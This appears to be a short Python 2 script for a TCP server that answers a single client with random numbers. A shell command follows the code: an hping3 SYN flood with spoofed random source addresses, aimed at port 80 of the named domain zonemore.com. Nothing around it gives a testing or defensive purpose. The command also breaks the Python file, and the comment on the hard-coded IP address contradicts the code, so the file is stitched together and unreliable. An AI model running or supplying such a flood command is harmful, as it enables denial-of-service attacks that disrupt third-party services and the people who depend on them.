# Echo server program
import socket
import time
import random


HOST = '114.55.102.246'                 # Symbolic name meaning all available interfaces
PORT = 6666           # Arbitrary non-privileged port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

while 1:
#    conn, addr = s.accept()
    print 'Connected by', addr

    data = conn.recv(1024)
    print 'from client data:', data
    conn.sendall(str(random.randint(1, 9999999999)))
    time.sleep(0.1)

conn.close()

hping3 -c 20000 -d 120 -S -w 64 -p 80 --flood --rand-source zonemore.com